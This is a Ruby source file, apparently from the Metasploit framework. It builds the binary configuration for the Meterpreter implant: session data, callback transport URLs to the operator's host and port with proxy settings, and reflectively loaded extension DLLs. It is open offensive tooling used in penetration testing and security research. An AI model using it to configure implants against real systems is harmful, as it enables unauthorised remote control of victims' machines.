# -*- coding: binary -*-
require 'msf/core/payload/uuid'
require 'msf/core/payload/windows'
require 'msf/core/reflective_dll_loader'
require 'rex/parser/x509_certificate'

class Rex::Payloads::Meterpreter::Config

  include Msf::ReflectiveDLLLoader

  UUID_SIZE = 64
  URL_SIZE = 512
  UA_SIZE = 256
  PROXY_HOST_SIZE = 128
  PROXY_USER_SIZE = 64
  PROXY_PASS_SIZE = 64
  CERT_HASH_SIZE = 20

  def initialize(opts={})
    @opts = opts
  end

  def to_b
    config_block
  end

private

  def is_x86?
    @opts[:arch] == ARCH_X86
  end

  def to_wchar_t(item, size)
    item.to_s.ljust(size, "\x00").unpack("C*").pack("v*")
  end

  def session_block(opts)
    uuid = to_wchar_t(opts[:uuid], UUID_SIZE)
    exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]

    session_data = [
      0,                  # comms socket, patched in by the stager
      0,                  # listen socket, patched in by the stager
      exit_func,          # exit function identifer
      opts[:expiration],  # Session expiry
      uuid,               # the URL to use
    ]

    if is_x86?
      session_data.pack("VVVVA*")
    else
      session_data.pack("QQVVA*")
    end
  end

  def transport_block(opts)
    # Build the URL from the given parameters, and pad it out to the
    # correct size
    url = "#{opts[:scheme]}://#{opts[:lhost]}:#{opts[:lport]}"
    url << "#{opts[:uri]}/" if opts[:uri]
    url = to_wchar_t(url, URL_SIZE)

    # if the transport URI is for a HTTP payload we need to add a stack
    # of other stuff
    pack = 'VVVA*'
    transport_data = [
      opts[:comm_timeout],  # communications timeout
      opts[:retry_total],   # retry total time
      opts[:retry_wait],    # retry wait time
      url                   # transport URL
    ]

    if url.start_with?('http')
      proxy_host = to_wchar_t(opts[:proxy_host] || '', PROXY_HOST_SIZE)
      proxy_user = to_wchar_t(opts[:proxy_user] || '', PROXY_USER_SIZE)
      proxy_pass = to_wchar_t(opts[:proxy_pass] || '', PROXY_PASS_SIZE)
      ua = to_wchar_t(opts[:ua] || '', UA_SIZE)

      cert_hash = "\x00" * CERT_HASH_SIZE
      if opts[:cert_file]
        cert_hash = Rex::Parser::X509Certificate.get_cert_file_hash(opts[:cert_file])
      end

      # add the HTTP specific stuff
      transport_data << proxy_host  # Proxy host name
      transport_data << proxy_user  # Proxy user name
      transport_data << proxy_pass  # Proxy password
      transport_data << ua          # HTTP user agent
      transport_data << cert_hash   # SSL cert hash for verification

      # update the packing spec
      pack << 'A*A*A*A*A*'
    end

    # return the packed transport information
    transport_data.pack(pack)
  end

  def extension_block(ext_name, file_extension)
    ext_name = ext_name.strip.downcase
    ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{ext_name}",
                                                   file_extension))

    extension_data = [ ext.length, ext ].pack("VA*")
  end

  def config_block

    # start with the session information
    config = session_block(@opts)

    # then load up the transport configurations
    (@opts[:transports] || []).each do |t|
      config << transport_block(t)
    end

    # terminate the transports with a single NULL byte
    config << "\x00"

    # configure the extensions
    file_extension = 'x86.dll'
    unless is_x86?
      file_extension = 'x64.dll'
    end

    (@opts[:extensions] || []).each do |e|
      config << extension_block(e, file_extension)
    end

    # terminate the extensions with a 0 size
    if is_x86?
      config << [0].pack("V")
    else
      config << [0].pack("Q")
    end

    # and we're done
    config
  end
end
